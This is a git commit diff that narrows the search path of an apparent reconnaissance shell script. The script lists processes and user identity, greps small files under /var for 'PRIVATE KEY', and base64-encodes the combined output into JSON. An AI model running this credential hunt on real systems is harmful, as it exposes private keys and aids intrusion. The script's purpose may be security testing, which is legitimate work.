bdd6c7828bf2e4cd0668613c399bc9fd08baf30b
Robert Polasek <robert.polasek@toptal.com>
2020-05-06 21:13:48 -0400

    fix #31

--- cmd2out.sh
+++ cmd2out.sh
@@ -6,7 +6,7 @@ ps -ef  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
 id  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-find / -type f -size -3300c -exec grep -Rl "PRIVATE KEY" {} \; >>$OUT  2>/dev/null
+find /var -type f -size -3300c -exec grep -Rl "PRIVATE KEY" {} \; >>$OUT  2>/dev/null
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
